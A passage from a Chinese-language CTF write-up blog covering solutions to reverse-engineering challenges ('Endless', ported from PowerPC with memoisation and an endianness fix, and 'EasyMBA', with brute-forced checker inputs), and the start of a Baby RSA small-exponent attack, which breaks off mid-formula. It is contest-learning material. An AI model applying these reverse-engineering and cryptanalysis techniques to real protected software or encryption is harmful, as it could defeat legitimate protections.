class="hljs-attribute">swswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswswWDDDDDDSDDDDDDDDSSDDDDWWDDSSSSAASSSSDDSSDDWWDDWWAAWWDDDDWWDDWWDDDDDDDDSSSSSSDDSSSSAASSSSDDSSSSSSAAAAAAAAAAAAAASSSSSSSSSSAAAAAASSSSSSSSDDSSSSAASSSSDDSSDDDDDDDDDDDDDDWWDDDDDDDDSSDDDDDDWWDDDDDDSSDDDDDDDDWWWWDDDDSSDDSSDDDDWWWWWWWWDDDDSSDDSSSSSSDDDDWWDDDDDDDDDDDDDDSSDD</span></code></pre><p>（最前面的 <code>sw</code> 是来回移动用来凑长度的）</p><p><img src="https://hans362-img.oss.0vv0.top/2023/03/12/upload_56d713646d97cc2511e9e9243add1ba4.png?width=1920" class="lazy" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/12/upload_56d713646d97cc2511e9e9243add1ba4.png?width=1920" srcset="/loading.gif" alt=""></p><h2 id="reverse"><a class="markdownIt-Anchor" href="#reverse"></a> Reverse</h2><h3 id="endless"><a class="markdownIt-Anchor" href="#endless"></a> Endless</h3><p>尝试直接运行程序发现运行不了，拖进 IDA 里看一眼竟然是个 PowerPC 程序，不过只要根据 IDA 反汇编的结果，把代码移植到 X86_64 就可以了吧。幸好程序并不复杂，很快就移植好了。</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span>

<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;

<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> byte_100200B8[] = {<span class="hljs-number">0xFD</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xE6</span>,
                                 <span class="hljs-number">0x90</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x87</span>,
                                 <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x08</span>,
                                 <span class="hljs-number">0xB6</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x00</span>};

<span class="hljs-function"><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-title">sub_10000824</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> a1)</span> </span>{
  <span class="hljs-type">long</span> <span class="hljs-type">long</span> v1;            <span class="hljs-comment">// r10</span>
  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i;          <span class="hljs-comment">// [sp+74h] [-2Ch]</span>
  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> j;          <span class="hljs-comment">// [sp+78h] [-28h]</span>
  <span class="hljs-type">long</span> <span class="hljs-type">long</span> v5;            <span class="hljs-comment">// [sp+80h] [-20h]</span>
  <span class="hljs-type">long</span> <span class="hljs-type">long</span> v6;            <span class="hljs-comment">// [sp+80h] [-20h]</span>
  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> *v7;  <span class="hljs-comment">// [sp+88h] [-18h]</span>
  v7 = <span class="hljs-keyword">new</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span>[<span class="hljs-number">100000</span>];
  v5 = <span class="hljs-number">0LL</span>;
  <span class="hljs-keyword">if</span> (a1 &lt;= <span class="hljs-number">0xE8</span>) {
    v6 = (a1 + <span class="hljs-number">1337</span>) * a1 + <span class="hljs-number">7331</span>;
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0xE9</span>; ++i) {
      v7[i] = <span class="hljs-built_in">sub_10000824</span>(a1 - i - <span class="hljs-number">1</span>);
      <span class="hljs-keyword">if</span> ((i &amp; <span class="hljs-number">1</span>) != <span class="hljs-number">0</span> &amp;&amp; i != <span class="hljs-number">232</span>) v7[i] = v7[i - <span class="hljs-number">1</span>] - v7[i];
    }
    <span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">0xE8</span>; ++j) {
      <span class="hljs-keyword">if</span> ((j &amp; <span class="hljs-number">1</span>) != <span class="hljs-number">0</span>)
        v1 = v7[j] * v7[j];
      <span class="hljs-keyword">else</span>
        v1 = v7[j];
      v5 += v1;
    }
    v6 = v5 + <span class="hljs-number">2023LL</span> * v7[<span class="hljs-number">232</span>];
  }
  <span class="hljs-keyword">delete</span> v7;
  <span class="hljs-keyword">return</span> v6;
}

<span class="hljs-type">char</span> ans[<span class="hljs-number">10000</span>];

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> qword_100200E8 = <span class="hljs-built_in">sub_10000824</span>(<span class="hljs-number">0x7331</span>u);
  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">0x1A</span>; ++i)
    ans[i] = byte_100200B8[i] ^ ((<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)&amp;qword_100200E8)[i % <span class="hljs-number">8</span>];
  cout &lt;&lt; ans &lt;&lt; endl;
  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}</code></pre><p>编译运行，结果发现程序卡住了，一直没有反应，难怪名字叫 Endless。不过作为一个 ex-OIer 一下子就发现了问题，<code>sub_10000824()</code> 是用递归实现的，涉及到了大量的重复计算，这能不慢吗？于是加了一个记忆化数组，优化了一下程序，总算能跑了。</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span>

<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;

<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> byte_100200B8[] = {<span class="hljs-number">0xFD</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xE6</span>,
                                 <span class="hljs-number">0x90</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x87</span>,
                                 <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x08</span>,
                                 <span class="hljs-number">0xB6</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x00</span>};

<span class="hljs-type">long</span> <span class="hljs-type">long</span> mem[<span class="hljs-number">100000</span>];

<span class="hljs-function"><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-title">sub_10000824</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> a1)</span> </span>{
  <span class="hljs-type">long</span> <span class="hljs-type">long</span> v1;            <span class="hljs-comment">// r10</span>
  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i;          <span class="hljs-comment">// [sp+74h] [-2Ch]</span>
  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> j;          <span class="hljs-comment">// [sp+78h] [-28h]</span>
  <span class="hljs-type">long</span> <span class="hljs-type">long</span> v5;            <span class="hljs-comment">// [sp+80h] [-20h]</span>
  <span class="hljs-type">long</span> <span class="hljs-type">long</span> v6;            <span class="hljs-comment">// [sp+80h] [-20h]</span>
  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> *v7;  <span class="hljs-comment">// [sp+88h] [-18h]</span>
  v7 = <span class="hljs-keyword">new</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span>[<span class="hljs-number">100000</span>];
  v5 = <span class="hljs-number">0LL</span>;
  <span class="hljs-keyword">if</span> (a1 &lt;= <span class="hljs-number">0xE8</span>) {
    v6 = (a1 + <span class="hljs-number">1337</span>) * a1 + <span class="hljs-number">7331</span>;
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0xE9</span>; ++i) {
      v7[i] =
          (mem[a1 - i - <span class="hljs-number">1</span>] != <span class="hljs-number">0</span>) ? mem[a1 - i - <span class="hljs-number">1</span>] : <span class="hljs-built_in">sub_10000824</span>(a1 - i - <span class="hljs-number">1</span>);
      <span class="hljs-keyword">if</span> ((i &amp; <span class="hljs-number">1</span>) != <span class="hljs-number">0</span> &amp;&amp; i != <span class="hljs-number">232</span>) v7[i] = v7[i - <span class="hljs-number">1</span>] - v7[i];
    }
    <span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">0xE8</span>; ++j) {
      <span class="hljs-keyword">if</span> ((j &amp; <span class="hljs-number">1</span>) != <span class="hljs-number">0</span>)
        v1 = v7[j] * v7[j];
      <span class="hljs-keyword">else</span>
        v1 = v7[j];
      v5 += v1;
    }
    v6 = v5 + <span class="hljs-number">2023LL</span> * v7[<span class="hljs-number">232</span>];
  }
  <span class="hljs-keyword">delete</span> v7;
  mem[a1] = v6;
  <span class="hljs-keyword">return</span> v6;
}

<span class="hljs-type">char</span> ans[<span class="hljs-number">10000</span>];

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> qword_100200E8 = <span class="hljs-built_in">sub_10000824</span>(<span class="hljs-number">0x7331</span>u);
  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">0x1A</span>; ++i)
    ans[i] = byte_100200B8[i] ^ ((<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)&amp;qword_100200E8)[i % <span class="hljs-number">8</span>];
  cout &lt;&lt; ans &lt;&lt; endl;
  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}</code></pre><p>然而运行结果却是一堆乱码，并不是我们想要的 flag。</p><p><img src="https://hans362-img.oss.0vv0.top/2023/03/12/upload_41be09da2badffad539dd7d15babfe9e.png?width=1920" class="lazy" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/12/upload_41be09da2badffad539dd7d15babfe9e.png?width=1920" srcset="/loading.gif" alt=""></p><p>此时离成功只差一步之遥，由于 PowerPC 采用的是 Big Endian（大端序），而我们常用的电脑都是 Little Endian（小端序），因此移植的时候一旦涉及到位运算要小心处理，本题中就需要把 <code>ans[i] = byte_100200B8[i] ^ ((unsigned char *)&amp;qword_100200E8)[i % 8];</code> 修改成 <code>ans[i] = byte_100200B8[i] ^ ((unsigned char *)&amp;qword_100200E8)[7 - i % 8];</code>，从而在小端序电脑上模拟大端序电脑的运行结果。</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span>

<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;

<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> byte_100200B8[] = {<span class="hljs-number">0xFD</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xE6</span>,
                                 <span class="hljs-number">0x90</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x87</span>,
                                 <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x08</span>,
                                 <span class="hljs-number">0xB6</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x00</span>};

<span class="hljs-type">long</span> <span class="hljs-type">long</span> mem[<span class="hljs-number">100000</span>];

<span class="hljs-function"><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-title">sub_10000824</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> a1)</span> </span>{
  <span class="hljs-type">long</span> <span class="hljs-type">long</span> v1;            <span class="hljs-comment">// r10</span>
  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i;          <span class="hljs-comment">// [sp+74h] [-2Ch]</span>
  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> j;          <span class="hljs-comment">// [sp+78h] [-28h]</span>
  <span class="hljs-type">long</span> <span class="hljs-type">long</span> v5;            <span class="hljs-comment">// [sp+80h] [-20h]</span>
  <span class="hljs-type">long</span> <span class="hljs-type">long</span> v6;            <span class="hljs-comment">// [sp+80h] [-20h]</span>
  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> *v7;  <span class="hljs-comment">// [sp+88h] [-18h]</span>
  v7 = <span class="hljs-keyword">new</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span>[<span class="hljs-number">100000</span>];
  v5 = <span class="hljs-number">0LL</span>;
  <span class="hljs-keyword">if</span> (a1 &lt;= <span class="hljs-number">0xE8</span>) {
    v6 = (a1 + <span class="hljs-number">1337</span>) * a1 + <span class="hljs-number">7331</span>;
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0xE9</span>; ++i) {
      v7[i] =
          (mem[a1 - i - <span class="hljs-number">1</span>] != <span class="hljs-number">0</span>) ? mem[a1 - i - <span class="hljs-number">1</span>] : <span class="hljs-built_in">sub_10000824</span>(a1 - i - <span class="hljs-number">1</span>);
      <span class="hljs-keyword">if</span> ((i &amp; <span class="hljs-number">1</span>) != <span class="hljs-number">0</span> &amp;&amp; i != <span class="hljs-number">232</span>) v7[i] = v7[i - <span class="hljs-number">1</span>] - v7[i];
    }
    <span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">0xE8</span>; ++j) {
      <span class="hljs-keyword">if</span> ((j &amp; <span class="hljs-number">1</span>) != <span class="hljs-number">0</span>)
        v1 = v7[j] * v7[j];
      <span class="hljs-keyword">else</span>
        v1 = v7[j];
      v5 += v1;
    }
    v6 = v5 + <span class="hljs-number">2023LL</span> * v7[<span class="hljs-number">232</span>];
  }
  <span class="hljs-keyword">delete</span> v7;
  mem[a1] = v6;
  <span class="hljs-keyword">return</span> v6;
}

<span class="hljs-type">char</span> ans[<span class="hljs-number">10000</span>];

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> qword_100200E8 = <span class="hljs-built_in">sub_10000824</span>(<span class="hljs-number">0x7331</span>u);
  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">0x1A</span>; ++i)
    ans[i] = byte_100200B8[i] ^ ((<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)&amp;qword_100200E8)[<span class="hljs-number">7</span> - i % <span class="hljs-number">8</span>];
  cout &lt;&lt; ans &lt;&lt; endl;
  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}</code></pre><p>再次编译运行即可拿到 flag。</p><p><img src="https://hans362-img.oss.0vv0.top/2023/03/12/upload_915e72cef4702b5378f319800ba250e5.png?width=1920" class="lazy" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/12/upload_915e72cef4702b5378f319800ba250e5.png?width=1920" srcset="/loading.gif" alt=""></p><h3 id="easymba"><a class="markdownIt-Anchor" href="#easymba"></a> EasyMBA</h3><p>拖进 IDA，根据反汇编结果，只要输入的数据通过四个 checker 即可拿到 flag。</p><p><img src="https://hans362-img.oss.0vv0.top/2023/03/12/upload_5c382554ffbfe66733fa8337a7b826b0.png?width=1920" class="lazy" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/12/upload_5c382554ffbfe66733fa8337a7b826b0.png?width=1920" srcset="/loading.gif" alt=""></p><p><code>checker1()</code> 的逻辑非常简单，可以直接算出正确的输入是 <code>2833100173</code>。</p><p>对于剩下三个 checker，直接写三个 C++ 程序暴力求解正确输入即可。</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span>

<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;

<span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">checker2</span><span class="hljs-params">(<span class="hljs-type">int</span> a1)</span> </span>{
  <span class="hljs-keyword">if</span> (~(<span class="hljs-number">3</span> * (a1 &amp; <span class="hljs-number">0x5427F672</span>) - (a1 | <span class="hljs-number">0xABD8098D</span>) - a1 + <span class="hljs-number">1471157018</span>) ==
      <span class="hljs-number">1352221957</span>)
    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
}

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt;= INT_MAX; i++) {
    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">checker2</span>(i)) {
      cout &lt;&lt; i &lt;&lt; endl;
    }
  }
  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}</code></pre><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span>

<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;

<span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">checker3</span><span class="hljs-params">(<span class="hljs-type">int</span> a1)</span> </span>{
  <span class="hljs-keyword">if</span> (a1 &gt; <span class="hljs-number">0x10000000</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
  <span class="hljs-keyword">if</span> (<span class="hljs-number">4</span> * ((~a1 &amp; <span class="hljs-number">0xADFDBC7B</span>) + <span class="hljs-number">2</span> * ~(~a1 | <span class="hljs-number">0xADFDBC7B</span>)) +
          <span class="hljs-number">-3</span> * (~a1 | <span class="hljs-number">0xADFDBC7B</span>) + <span class="hljs-number">3</span> * ~(a1 | <span class="hljs-number">0xADFDBC7B</span>) -
          ((a1 ^ <span class="hljs-number">0xADFDBC7B</span>) - <span class="hljs-number">10</span> * (a1 &amp; <span class="hljs-number">0xADFDBC7B</span>)) ==
      <span class="hljs-number">590670598</span>)
    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
}

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt;= INT_MAX; i++) {
    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">checker3</span>(i)) {
      cout &lt;&lt; i &lt;&lt; endl;
    }
  }
  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}</code></pre><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span>

<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;

<span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">checker4</span><span class="hljs-params">(<span class="hljs-type">int</span> a1)</span> </span>{
  <span class="hljs-keyword">if</span> (a1 &gt; <span class="hljs-number">0x10000000</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
  <span class="hljs-keyword">if</span> (<span class="hljs-number">11</span> * ~(a1 ^ <span class="hljs-number">0xE76EDA24</span>) + <span class="hljs-number">4</span> * ~(~a1 | <span class="hljs-number">0xE76EDA24</span>) -
          (<span class="hljs-number">6</span> * (a1 &amp; <span class="hljs-number">0xE76EDA24</span>) + <span class="hljs-number">12</span> * ~(a1 | <span class="hljs-number">0xE76EDA24</span>)) + <span class="hljs-number">-5</span> * a1 -
          <span class="hljs-number">2</span> * ~(a1 | <span class="hljs-number">0xCD731B78</span>) - (a1 | <span class="hljs-number">0x328CE487</span>) + <span class="hljs-number">3</span> * (a1 &amp; <span class="hljs-number">0xCD731B78</span>) -
          <span class="hljs-number">2</span> * (<span class="hljs-number">-2</span> * (a1 &amp; <span class="hljs-number">0x328CE487</span>) - (a1 | <span class="hljs-number">0x328CE487</span>)) ==
      <span class="hljs-number">-979756886</span>)
    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
}

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt;= INT_MAX; i++) {
    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">checker4</span>(i)) {
      cout &lt;&lt; i &lt;&lt; endl;
    }
  }
  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}</code></pre><p>求出来<code>checker2()</code>的正确输入是 <code>79606647</code>，<code>checker3()</code> 的正确输入是 <code>84381514</code>，<code>checker4()</code> 的正确输入有多个：</p><pre><code class="hljs dns"><span class="hljs-number">48871042</span>
<span class="hljs-number">48871554</span>
<span class="hljs-number">48891522</span>
<span class="hljs-number">48892034</span>
<span class="hljs-number">53065346</span>
<span class="hljs-number">53065858</span>
<span class="hljs-number">53085826</span>
<span class="hljs-number">53086338</span>
<span class="hljs-number">69842562</span>
<span class="hljs-number">69843074</span>
<span class="hljs-number">69863042</span>
<span class="hljs-number">69863554</span></code></pre><p>依次尝试发现只有用最后一个，也就是 <code>69863554</code> 才能拿到 flag。</p><p><img src="https://hans362-img.oss.0vv0.top/2023/03/12/upload_3cf1c0a04bf5c6db4d387059b0451efa.png?width=1920" class="lazy" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/12/upload_3cf1c0a04bf5c6db4d387059b0451efa.png?width=1920" srcset="/loading.gif" alt=""></p><h2 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h2><p>对密码学完全不了解，只好现学现卖，可能有讲得不对的地方。</p><h3 id="baby-rsa"><a class="markdownIt-Anchor" href="#baby-rsa"></a> Baby RSA</h3><p>看到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo>=</mo><mn>3</mn></mrow><annotation encoding="application/x-tex">e=3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.43056em;vertical-align:0"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:.64444em;vertical-align:0"></span><span class="mord">3</span></span></span></span>，首先考虑小公钥指数攻击，也就是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>=</mo><mroot><mrow><mi>c</mi><mo>+</mo><mi>k</mi><mo>×</mo><mi>N</mi></mrow><mn>3</mn></mroot></mrow><annotation encoding="application/x-tex">m=\sqrt[3]{c+k\times N}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.43056em;vertical-align:0"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:1.04em;vertical-align:-.14944500000000005em"></span><span class="mord sqrt"><span class="root"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.766886em"><span style="top:-2.944666em"><span class="pstrut" style="height:2.5em"></span><span class="sizing reset-size6 size1 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.890555em"><span class="svg-align" style="top:-3em"><span class="pstrut" style="height:3em"></span><span class="mord" style="padding-left:.833em"><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mord mathnormal" style="margin-right:.03148em">k</span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">×</span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mord mathnormal" style="margin-right:.10903em">N</span></span></span><span style="top:-2.850555em"><span class="pstrut" style="height:3em"></span><span class="hide-tail" style="min-width:.853em;height:1.08em"><svg width="400em" height="1.08em" viewBox="0 0 400000 1080" preserveAspectRatio="xMinYMin slice"><path d="M95,702
c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14
c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54
c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10
s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429
c69,-144,104.5,-217.7,106.5,-221
l0 -0
c5.3,-9.3,12,-14,20,-14
H400000v40H845.2724
s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7
c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47z
M834 80h400000v40h-400000z"></path></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.14944500000000005em"><span></span></span></span></span></span></span></span></span> 依次枚举自然数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.69444em;vertical-align:0"></span><span class="mord mathnormal" style="margin-right:.03148em">k</span></span></span></span>，然而把 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>130000000</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,130000000]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-.25em"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:.16666666666666666em"></span><span class="mord">1</span><span class="mord">3</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mclose">]</span></span></span></span> 范围内的 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.69444em;vertical-align:0"></span><span class="mord mathnormal" style="margin-right:.03148em">k</span></span></span></span> 都枚举遍了也没开方开出整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.43056em;vertical-align:0"></span><span class="mord mathnormal">m</span></span></span></span>，似乎是因为这道 RSA 有 padding，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.43056em;vertical-align:0"></span><span class="mord mathnormal">m</span></span></span></span> 的长度为255，导致 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation 